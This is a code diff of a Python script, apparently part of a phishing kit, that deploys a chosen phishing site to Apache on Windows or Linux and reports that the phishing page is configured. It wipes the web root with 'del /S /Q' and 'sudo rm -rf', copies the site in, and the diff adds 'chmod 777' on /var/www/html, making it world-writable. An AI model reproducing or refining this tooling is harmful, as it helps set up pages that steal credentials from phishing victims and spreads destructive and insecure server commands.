@@ -43,7 +43,6 @@ try:
         try:
             os.system(f"cd sites/{carpeta}")
             print("Iniciando el servidor...")
-            os.system("cd C:\\Apache24\\htdocs\\")
             os.system("del /S /Q C:\\Apache24\\htdocs\\*") 
             os.system(f"xcopy /E /I sites\\{carpeta}\\* C:\\Apache24\\htdocs\\")
             os.system("NET START Apache2.4")
@@ -60,8 +59,9 @@ try:
         os.system(f"cd sites/{carpeta}")
         print("Iniciando el servidor...")
         os.system("sudo rm -rf /var/www/html/*")  
-        os.system(f"sudo cp -r sites/{carpeta} /var/www/html/")
+        os.system(f"sudo cp -r sites/{carpeta}/* /var/www/html/")
         os.system("sudo systemctl start apache2")
+        os.system("sudo chmod 777 /var/www/html/* && sudo chmod 777 /var/www/html/")
 
         print("El servidor se ha iniciado y la página de phishing se ha configurado correctamente.")
         print("")
